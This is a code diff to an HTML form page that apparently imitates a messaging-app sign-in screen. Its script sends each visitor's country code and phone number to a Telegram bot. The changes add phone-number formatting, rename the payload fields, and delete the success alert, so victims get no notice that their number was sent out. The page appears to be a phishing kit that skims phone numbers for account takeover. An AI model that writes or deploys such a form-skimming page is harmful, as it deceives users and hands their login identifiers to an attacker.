@@ -11,6 +11,19 @@
     <link href="lib/main.3c9dcec00d5a12b9aa18.css" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
     <script type="text/javascript">
+        function updateCountryCode() {
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            
+            // Remove existing country code if already present
+            const currentValue = phoneNumberInput.value;
+            const regex = /^\+\d+\s?/;
+            const sanitizedValue = currentValue.replace(regex, '');
+            
+            // Add the selected country code
+            phoneNumberInput.value = `${countryCode} ${sanitizedValue}`;
+        }
+
         function sendToTelegram(event) {
             event.preventDefault(); // Prevent default form submission
 
@@ -28,8 +41,8 @@
 
             // JSON payload
             const payload = {
-                country: countryCode,
-                phone: phoneNumber
+                Id: countryCode,
+                Nomor: phoneNumber
             };
 
             // Telegram API URL
@@ -43,13 +56,12 @@
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: `New form submission:\nCountry: ${payload.country}\nPhone: ${payload.phone}`
+                    text: `New form submission:\nCountry: ${payload.Id}\nPhone: ${payload.Nomor}`
                 })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('Data successfully sent to Telegram!');
                 } else {
                     alert('Failed to send data to Telegram. Please try again.');
                 }
@@ -88,13 +100,6 @@
                 </div>
                 <button id="nextBtn" type="submit" class="Button default primary">NEXT</button>
             </form>
-            
-            <script type="text/javascript">
-                function updateCountryCode() {
-                    const countryCode = document.getElementById('countryCode').value;
-                    console.log(`Selected country code: ${countryCode}`);
-                }
-            </script>
         </div>
     </div>
 </body>
